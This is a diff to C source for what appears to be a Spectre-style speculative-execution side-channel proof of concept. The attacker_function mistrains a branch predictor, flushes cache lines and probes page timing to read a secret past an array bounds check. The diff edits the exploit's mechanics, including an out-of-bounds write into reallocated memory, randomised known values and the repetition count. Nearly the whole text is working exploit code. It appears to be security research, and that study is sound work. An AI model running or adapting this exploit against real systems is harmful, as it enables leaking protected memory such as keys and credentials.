@@ -44,13 +44,13 @@ void set_heap_limit(size_t limit_bytes) {
 }
 
 char* secret_init(){
-    char* array = malloc(array_size);
+    char* array = malloc(16);
     if (array == NULL) {
         perror("Initial malloc failed");
         return NULL;
     }
     array[0] = 'A';
-    printf("Secret addr: %p\n", array);
+    // printf("Secret addr: %p\n", array);
     return array;
 }
 
@@ -61,31 +61,29 @@ uint8_t* array_init(){
         return NULL;
     }
     memset(array, '-', array_size);
-    printf("Array addr: %p\n", array);
+    // printf("Array addr: %p\n", array);
     return array;
 }
 
-uint8_t* otherArray_init(uint32_t size, uint32_t malicious_index, char known_value){
-    uint8_t* array = malloc(size * sizeof(uint8_t));
+void otherArray_init(uint32_t size, uint32_t malicious_index, char known_value, uint8_t* prevReallocArray){
+    uint8_t* array = prevReallocArray + size + (malicious_index-1);
     if (array == NULL) {
         perror("Initial malloc failed");
-        return NULL;
     }
-    memset(array, '-', size);
-    array[malicious_index] = known_value;
-    printf("Other Array addr: %p\n", array);
-    return array;
+    *array = known_value;
+    // printf("Malicious Setting Addr: %p, Previous Realloc Array %p\n", array, prevReallocArray);
+    // printf("Size: %u, Malicious Index: %u, Known Value: %c\n", size, malicious_index, known_value);
 }
 
 char random_char(){
-    return 'Z';
-    // return (char)(rand() % 93 + 33);
+    // return 'Z';
+    return (char)(rand() % 93 + 33);
 }
 
 
 
 
-#define REP 100 // Number of repetitions to de-noise the channel
+#define REP 10 // Number of repetitions to de-noise the channel
 #define TRAINING_EPOCH 32 // 15 in-bound accesses then 1 out-of-bound access
 #define BUF_SIZE 1
 
@@ -168,7 +166,6 @@ uint8_t* victim_function(uint8_t** array, uint8_t * page, uint32_t index, uint32
     index &= array_index_mask_nospec(index, new_size);
     uint8_t secret = (*array)[index];
     _maccess(page + secret * stride);
-
     return NULL;
 }
 
@@ -178,7 +175,7 @@ void attacker_function() {
     // SYMBOL_CNT=256
     uint8_t *array = array_init();
     char *secret = secret_init();
-    printf("Offset: %#lx\n", (uintptr_t)secret - (uintptr_t)array);
+    // printf("Offset: %#lx\n", (uintptr_t)secret - (uintptr_t)array);
 
     uint8_t *pages = mmap(NULL, PAGE_SIZE * SYMBOL_CNT, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
@@ -200,19 +197,24 @@ void attacker_function() {
     printf("The malicious index is %p-%p=%#lx\n", secret, array_base,
            malicious_index);
     printf("-----------------------------------------\n");
-    array_base = &array[0];
-    // printf("attacker: array base addr: %p, secret addr: %p\n", array_base, secret);
-    //malicious_index = (uintptr_t)secret - (uintptr_t)array_base;
+
     size_t safe_size = array_size-1; //New size but not too small to actually want to resize
     size_t safe_index = array_size/2; //An in-bound index
     size_t malicious_size = (size_t)(malicious_index+1);
 
-    uint8_t* otherArray = otherArray_init(malicious_size, malicious_index, 'Z');
+    uint8_t *otherArray = malloc(malicious_size * sizeof(uint8_t));
     char known_value = random_char();
+    otherArray_init(malicious_size * sizeof(uint8_t), malicious_index, known_value, otherArray);
+    free(otherArray);
     // printf("Other Array addr: %p\n", otherArray);
 
     for (size_t c = 0; c < strlen(secret) && c < BUF_SIZE; c++) {
         for (size_t r = 0; r < REP; r++) {
+            array_base = &array[0]; // Base address
+            malicious_index = (uintptr_t)secret - (uintptr_t)array_base;
+            safe_size = array_size-1; //New size but not too small to actually want to resize
+            safe_index = array_size/2; //An in-bound index
+            malicious_size = (size_t)(malicious_index+1);
             for (size_t t = 0; t < TRAINING_EPOCH; t++) {
                 // We use an in-bound index for the first TRAINING_EPOCH - 1
                 // iterations and switch to the malicious index
@@ -227,9 +229,6 @@ void attacker_function() {
                 // startIndex, stride, N
                 flush_lines(pages, PAGE_SIZE, SYMBOL_CNT);
                 _mm_clflush((void *)&array_size);
-                if (is_attack) {
-                    free(otherArray);
-                }
                 // Ensure clflushes are finished
                 _mm_mfence();
                 _mm_lfence();
@@ -251,10 +250,12 @@ void attacker_function() {
             }
             // Trick: array_init will reuse the old array location due to memory allocator's locality optimization
             // printf("Reallocated array pointer: %p\n", array);
+            otherArray_init(malicious_size, malicious_index, known_value, array);
             free(array);
             array = array_init();
             known_value = random_char();
-            otherArray = otherArray_init(malicious_size, malicious_index, known_value);
+            // printf("Malicious Index after realloc: %#lx\n", (uintptr_t)secret - (uintptr_t)array);
+
             // printf("Incorrect Other Access %c\n", otherArray[malicious_index]);
         }
 
